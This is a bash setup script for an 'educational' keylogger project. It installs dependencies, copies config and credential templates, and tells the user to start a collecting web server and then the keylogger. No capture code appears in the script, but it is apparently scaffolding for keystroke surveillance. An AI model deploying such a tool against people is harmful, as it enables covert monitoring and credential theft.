#!/bin/bash

# Setup script for Keylogger Project
# For educational purposes only

echo "=========================================="
echo "  Keylogger Project Setup"
echo "=========================================="
echo ""

# Check if Python 3 is installed
if ! command -v python3 &> /dev/null; then
    echo "Error: Python 3 is not installed."
    echo "Please install Python 3 and try again."
    exit 1
fi

echo "✓ Python 3 found: $(python3 --version)"
echo ""

# Create virtual environment (optional but recommended)
read -p "Create a virtual environment? (recommended) [Y/n]: " create_venv
create_venv=${create_venv:-Y}

if [[ $create_venv =~ ^[Yy]$ ]]; then
    echo "Creating virtual environment..."
    python3 -m venv venv
    
    if [ $? -eq 0 ]; then
        echo "✓ Virtual environment created"
        echo ""
        echo "To activate the virtual environment, run:"
        echo "  source venv/bin/activate    (Linux/Mac)"
        echo "  venv\\Scripts\\activate      (Windows)"
        echo ""
        
        # Activate virtual environment
        source venv/bin/activate 2>/dev/null || . venv/bin/activate
    else
        echo "Warning: Failed to create virtual environment"
    fi
fi

# Install dependencies
echo "Installing dependencies..."
pip install -r requirements.txt

if [ $? -eq 0 ]; then
    echo "✓ Dependencies installed successfully"
else
    echo "Error: Failed to install dependencies"
    exit 1
fi

echo ""

# Setup configuration files
echo "Setting up configuration files..."

if [ ! -f "config/config.json" ]; then
    cp config/config.json.example config/config.json
    echo "✓ Created config/config.json from example"
    echo "  Please edit config/config.json with your settings"
else
    echo "✓ config/config.json already exists"
fi

if [ ! -f "config/.env" ]; then
    cp config/.env.example config/.env
    echo "✓ Created config/.env from example"
    echo "  Please edit config/.env with your credentials"
else
    echo "✓ config/.env already exists"
fi

echo ""

# Create logs directory if it doesn't exist
mkdir -p logs
echo "✓ Logs directory ready"

echo ""
echo "=========================================="
echo "  Setup Complete!"
echo "=========================================="
echo ""
echo "Next steps:"
echo "1. Edit config/config.json with your server URL and settings"
echo "2. Edit config/.env with secure credentials (change default password!)"
echo "3. Run the web server: python3 src/server.py"
echo "4. Run the keylogger: python3 src/keylogger.py"
echo ""
echo "For more information, see README.md"
echo ""
echo "⚠️  IMPORTANT: This tool is for educational purposes only."
echo "   Always obtain explicit consent before monitoring."
echo ""
